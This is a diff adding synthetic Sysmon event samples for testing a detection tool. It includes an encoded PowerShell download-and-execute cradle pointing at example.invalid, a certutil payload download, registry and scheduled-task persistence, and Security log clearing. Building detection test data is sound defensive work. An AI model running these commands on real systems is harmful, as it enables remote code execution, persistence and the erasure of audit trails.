@@ -1,0 +1,55 @@
+# SYNTHETIC SAMPLE EVENTS
+# Made up for testing the Sysmon Event Analyzer. They are not real incidents.
+# IP addresses use the documentation range (203.0.113.0/24) and the domain example.invalid.
+# Copy ONE sample at a time (the lines under a heading) into the tool. Do not include the # lines.
+
+# Sample 1: Word spawns encoded PowerShell
+EventCode: 1
+Computer: WS-DEMO-01
+User: DEMO\analyst
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentImage: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+CommandLine: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGkAbgB2AGEAbABpAGQALwBzAHQAYQBnAGUALgBwAHMAMQAnACkA
+
+# Sample 2: Connection to port 4444
+EventCode: 3
+Computer: WS-DEMO-02
+Image: C:\Users\demo\AppData\Local\Temp\update.exe
+SourceIp: 10.0.0.15
+DestinationIp: 203.0.113.50
+DestinationPort: 4444
+
+# Sample 3: Run key persistence
+EventCode: 13
+Computer: WS-DEMO-03
+Image: C:\Windows\System32\reg.exe
+TargetObject: HKU\S-1-5-21-DEMO\Software\Microsoft\Windows\CurrentVersion\Run\Updater
+Details: powershell.exe -w hidden -file C:\Users\Public\x.ps1
+
+# Sample 4: Ordinary browser activity (expected: no rule matches)
+EventCode: 1
+Computer: WS-DEMO-04
+Image: C:\Program Files\Google\Chrome\Application\chrome.exe
+ParentImage: C:\Windows\explorer.exe
+CommandLine: "C:\Program Files\Google\Chrome\Application\chrome.exe"
+
+# Sample 5: Certutil file download
+EventCode: 1
+Computer: WS-DEMO-05
+Image: C:\Windows\System32\certutil.exe
+ParentImage: C:\Windows\System32\cmd.exe
+CommandLine: certutil.exe -urlcache -f http://example.invalid/a.exe C:\Users\Public\a.exe
+
+# Sample 6: Security log cleared with wevtutil
+EventCode: 1
+Computer: WS-DEMO-06
+Image: C:\Windows\System32\wevtutil.exe
+ParentImage: C:\Windows\System32\cmd.exe
+CommandLine: wevtutil cl Security
+
+# Sample 7: Scheduled task created
+EventCode: 1
+Computer: WS-DEMO-07
+Image: C:\Windows\System32\schtasks.exe
+ParentImage: C:\Windows\System32\cmd.exe
+CommandLine: schtasks /create /tn Updater /tr C:\Users\Public\x.exe /sc onlogon
